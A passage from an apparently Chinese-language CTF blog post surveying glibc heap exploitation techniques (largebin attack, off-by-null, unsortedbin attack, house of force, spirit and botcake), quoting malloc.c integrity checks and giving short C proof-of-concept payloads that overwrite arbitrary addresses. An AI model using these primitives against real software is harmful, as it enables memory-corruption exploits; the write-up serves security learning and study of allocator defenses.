class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                    malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (nextsize)"</span>);</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即增加了对应的保护机制：</p>
+<p><a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3867" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3867</a><br><a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3873" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3873</a></p>
+<p>所以这里提供两种payload，就是构造的size大小顺序问题。<strong>第一种适用于所有版本</strong>，第二种在加了保护之后已经失效：</p>
+<p><strong>payload1:</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x4a8</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x478</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="comment">// trigger chunk1 into largebin </span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x600</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(p1+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// largebin attack</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>payload2:</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x478</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x4a8</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="comment">// trigger chunk1 into largebin </span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x600</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(p1+<span class="number">0x10</span>) = <span class="number">0</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(p1+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// largebin attack</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>off by null 其实看似脑洞，不过这种问题在实际中存在还是非常多的，比如一些字符串处理函数，如strcpy这种，结尾长度控制不当，很容易造成多写入一个\x00字节的情况。</p>
+<p><strong>传统的off by null思路</strong></p>
+<p><img src="1582695616602.png" alt="1582695616602"></p>
+<p>这里说前向合并或者后向合并容易产生歧义，所以我就用高低地址来表示。</p>
+<p>因为free chunk2的时候会检测P位而发生向低地值的合并：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    <span class="built_in">size</span> += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以chunk2的指针就会根据其pre_size发生向低地值的扩展。但同时unlink的代码是这样的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;	</span><br><span class="line"><span class="comment">// ... ...</span></span><br></pre></td></tr></table></figure>
+
+<p>检测P的fd和bk的合法性。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">     malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure>
+
+<p>这也是图中步骤1的作用，先把chunk0放入unsortedbin中，这样靠系统帮助我们完成检测。这一步就绕过去了。</p>
+<p>之后还会进行向高地址合并的检测：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        <span class="built_in">size</span> += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>为了不触发这段机制，我们只能让代码走到else部分，这就是步骤2的作用，伪造的nextchunk的nextchunk在chunk内的区域，让<code>clear_inuse_bit_at_offset(nextchunk, 0);</code>不影响我们的操作。</p>
+<p>达成的效果就是：chunk0和chunk2中间的chunk1（当然也可以有很多chunk），可以被我们复用，实现等效于UAF的效果。</p>
+<p><strong>2.29后的off by null</strong></p>
+<p>上述的一切在2.29后变得不再成立，因为向低地值合并的代码加了一段检测：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    <span class="built_in">size</span> += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不过这里依然可以利用，核心思想就是<strong>利用chunk中的残留指针信息，以及对堆布局的理解与预测</strong>来实现。</p>
+<p>具体的分析过程过长，不过我之前在看雪投过一篇文章：</p>
+<p><a href="https://bbs.pediy.com/thread-257901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257901.htm</a></p>
+<p><strong>对应题目：</strong>balsnCTF-2019-plaintext</p>
+<p><strong>WP：</strong><a href="http://blog.eonew.cn/archives/1233" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1233</a></p>
+<hr>
+<h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h3><p>unsortedbin attack是一种很简单的利用方式，也可以实现向任意地址写入大数。实现方法只需要改写unsortedbin里面chunk的bk即可。</p>
+<p>不过目前增加了patch后，这种方法已经失效。</p>
+<p><a href="https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3754" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3754</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unsorted double linked list corrupted"</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>house of force是利用溢出修改top chunk的size信息，在通过malloc计算好的size，以实现top chunk任意地址分配的效果。</p>
+<p>不过patch后，同样失效。</p>
+<p><a href="https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L4114" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L4114</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">size</span> &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): corrupted top size"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>当然，也有一种思路，也是可以利用的，因为<code>av-&gt;system_mem</code>是记录在<code>main_arena</code>里面的值，同时其所在段的权限是可写的，所以只要修改掉这个值，就可以继续利用了。不过这么利用，总觉有一种本末倒置的感觉。</p>
+<hr>
+<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p>这种方法依然可用，即通过伪造数据使系统判断这个地址指向是一个合法的chunk，之后即可free对应的地址。甚至在tcache下可能会更加容易。不过我个人感觉这种技术本身上没什么应用场景。</p>
+<hr>
+<h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>从how2heap上看到的，一种适用于tcache的技巧。基于double free漏洞，利用unsortedbin和tcache的布局，达成overlap的效果。payload大致如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *x[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* res = <span class="built_in">malloc</span>(<span class="number">0x130</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(res+<span class="number">0x110</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *target = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
+
+
+			
+		</div>
+		<footer class="clearfix">
+			
+				
+				
+			
+			
+	<div class="categories">
+		<i class="fa fa-folder"></i>
+		
+			<a href="/categories/CTF/">CTF</a>
+		
+	</div>
+
+			
+	<div class="tags">
+		<i class="fa fa-tags"></i>
+		
+			<a href="/tags/Exploit/">#Exploit</a>
+		
+	</div>
+
+		</footer>
+	</div>
+</article>
+	
+
+	<nav id="pagination">
+	
+	
+</nav>
+
+	
+
+
+		</div>
+		
+	</div>
+</div>
+
+<footer id="footer">
+	<div class="center">
+		&copy; 2020
+		
+			cxm95@StarCross
+		.
+		&nbsp;&nbsp;
+		Blog generated by <a href="http://hexo.io" target="_blank" rel="noopener">hexo</a>
+	</div>
+</footer>
+
+<script src="/bower_components/jquery/dist/jquery.min.js"></script>
+<script src="/js/header-animate.js"></script>
+
+
+	<script src="/js/title-animate.js"></script>
+
+
+<script src="/bower_components/jquery_lazyload/jquery.lazyload.js"></script>
+<script>
+	$('img.lazy').lazyload();
+</script>
+
+	<script src="/bower_components/fancybox/source/jquery.fancybox.pack.js"></script>
+	<script>
+		$('.fancybox').fancybox();
+	</script>
+
+
+
+
+</body>
+</html>
